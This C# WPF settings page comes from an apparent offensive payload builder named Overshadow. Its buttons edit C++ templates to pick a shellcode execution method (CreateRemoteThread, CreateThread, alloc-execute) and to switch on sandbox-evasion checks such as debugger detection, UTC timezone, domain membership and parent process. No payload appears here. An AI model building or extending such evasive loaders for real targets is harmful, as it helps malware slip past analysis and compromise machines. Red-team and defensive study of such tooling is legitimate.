using System.IO;
using System.Windows;
using System.Windows.Controls;

namespace Overshadow
{
    public partial class Settings : Page
    {
        public Settings()
        {
            InitializeComponent();
            RevertTemplates();
        }

        public string CheckPleaseTemplate = @"..\..\Scatter\Brain\CheckPleaseTemplate.cpp";
        public string CheckPlease = @"..\..\Scatter\Brain\CheckPlease.cpp";
        public string ScatterBrainTemplate = @"..\..\Scatter\Brain\scatterbrainTemplate.cpp";
        public string ScatterBrain = @"..\..\Scatter\Brain\scatterbrain.cpp";

        public string UtcCheck = "Disabled";
        public string DebuggerCheck = "Disabled";
        public string ComputerNameCheck = "Disabled";
        public string UserNameCheck = "Disabled";
        public string DomainJoined = "Disabled";
        public string BadParent = "Disabled";
        public string ExecutionMethod = "Not Configured";

        public void RevertTemplates()
        {
            // Revert all templates to running via CreateRemoteThread and no SafetyChecks.
            string scatterTemplate = File.ReadAllText(ScatterBrainTemplate);
            string checkTemplate = File.ReadAllText(CheckPleaseTemplate);

            scatterTemplate = scatterTemplate.Replace("RunViaCreateRemoteThread();", "//RunViaCreateRemoteThread();");
            scatterTemplate = scatterTemplate.Replace("RunViaAllocExecute();", "//RunViaAllocExecute();");
            scatterTemplate = scatterTemplate.Replace("RunViaCreateThread();", "//RunViaCreateThread();");
            scatterTemplate = scatterTemplate.Replace("////", "//");
            File.WriteAllText(ScatterBrainTemplate, scatterTemplate);

            checkTemplate = checkTemplate.Replace("if (!IsUTCTimeZone", "//if (!IsUTCTimeZone");
            checkTemplate = checkTemplate.Replace("if (IsDebuggerAttached", "//if (IsDebuggerAttached");
            checkTemplate = checkTemplate.Replace("if (!HasComputerName", "//if (!HasComputerName");
            checkTemplate = checkTemplate.Replace("BOOL userCheck", "//BOOL userCheck");
            checkTemplate = checkTemplate.Replace("BOOL domCheck", "//BOOL domCheck");
            checkTemplate = checkTemplate.Replace("if (HasBadParentProcess", "//if (HasBadParentProcess");
            checkTemplate = checkTemplate.Replace("////", "//");
            File.WriteAllText(CheckPleaseTemplate, checkTemplate);
        }

        public void DisableCreateRemoteThread(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(ScatterBrainTemplate);
            str = str.Replace("RunViaCreateRemoteThread();", "//RunViaCreateRemoteThread();");
            File.WriteAllText(ScatterBrainTemplate, str);
            File.WriteAllText(ScatterBrain, str);
            ExecutionMethod = "Not Configured";
        }
        public void EnableCreateRemoteThread(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(ScatterBrainTemplate);
            str = str.Replace("//RunViaCreateRemoteThread();", "RunViaCreateRemoteThread();");
            File.WriteAllText(ScatterBrainTemplate, str);
            File.WriteAllText(ScatterBrain, str);
            ExecutionMethod = "CreateRemoteThread";
        }
        public void DisableAllocExecute(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(ScatterBrainTemplate);
            str = str.Replace("RunViaAllocExecute();", "//RunViaAllocExecute();");
            File.WriteAllText(ScatterBrainTemplate, str);
            File.WriteAllText(ScatterBrain, str);
            ExecutionMethod = "Not Configured";
        }
        public void EnableAllocExecute(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(ScatterBrainTemplate);
            str = str.Replace("//RunViaAllocExecute();", "RunViaAllocExecute();");
            File.WriteAllText(ScatterBrainTemplate, str);
            File.WriteAllText(ScatterBrain, str);
            ExecutionMethod = "AllocExecute";
        }
        public void DisableCreateThread(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(ScatterBrainTemplate);
            str = str.Replace("RunViaCreateThread();", "//RunViaCreateThread();");
            File.WriteAllText(ScatterBrainTemplate, str);
            File.WriteAllText(ScatterBrain, str);
            ExecutionMethod = "Not Configured";
        }
        public void EnableCreateThread(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(ScatterBrainTemplate);
            str = str.Replace("//RunViaCreateThread();", "RunViaCreateThread();");
            File.WriteAllText(ScatterBrainTemplate, str);
            File.WriteAllText(ScatterBrain, str);
            ExecutionMethod = "CreateThread";
        }
        public void DisableUTCCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("if (!IsUTCTimeZone", "//if (!IsUTCTimeZone");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            UtcCheck = "Disabled";
        }
        public void EnableUTCCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("//if (!IsUTCTimeZone", "if (!IsUTCTimeZone");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            UtcCheck = "Enabled";
        }
        private void EnableDebuggerCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("//if (IsDebuggerAttached", "if (IsDebuggerAttached");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            DebuggerCheck = "Enabled";
        }
        private void DisableDebuggerCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("if (IsDebuggerAttached", "//if (IsDebuggerAttached");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            DebuggerCheck = "Disabled";
        }
        private void EnableComputerNameCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("//if (!HasComputerName", "if (!HasComputerName");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            ComputerNameCheck = "Enabled";
        }
        private void DisableComputerNameCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("if (!HasComputerName", "//if (!HasComputerName");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            ComputerNameCheck = "Disabled";
        }
        private void EnableUserNameCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("//BOOL userCheck", "BOOL userCheck");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            UserNameCheck = "Enabled";
        }
        private void DisableUserNameCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("BOOL userCheck", "//BOOL userCheck");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            UserNameCheck = "Disabled";
        }
        private void EnableDomainCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("//BOOL domCheck", "BOOL domCheck");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            DomainJoined = "Enabled";
        }
        private void DisableDomainCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("BOOL domCheck", "//BOOL domCheck");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            DomainJoined = "Disabled";
        }
        private void EnableBadParentCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("//if (HasBadParentProcess", "if (HasBadParentProcess");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            BadParent = "Enabled";
        }
        private void DisableBadParentCheck(object sender, RoutedEventArgs e)
        {
            string str = File.ReadAllText(CheckPleaseTemplate);
            str = str.Replace("if (HasBadParentProcess", "//if (HasBadParentProcess");
            File.WriteAllText(CheckPleaseTemplate, str);
            File.WriteAllText(CheckPlease, str);
            BadParent = "Disabled";
        }

        private void clickMeHarder_Click(object sender, RoutedEventArgs e)
        {
            MessageBoxResult result = MessageBox.Show(string.Format ("UTC Check is {0} " +
                "\nDebugger Check is {1} " +
                "\nComputer Name Check is {2} " +
                "\nUser Name Check is {3} " +
                "\nDomain Joined Check is {4} " +
                "\nBad Parent Process Check is {5}" +
                "\n\nExecution Method is {6}"
                , UtcCheck, DebuggerCheck, ComputerNameCheck, UserNameCheck, DomainJoined, BadParent, ExecutionMethod), "Checkplease Settings");
        }
    }
}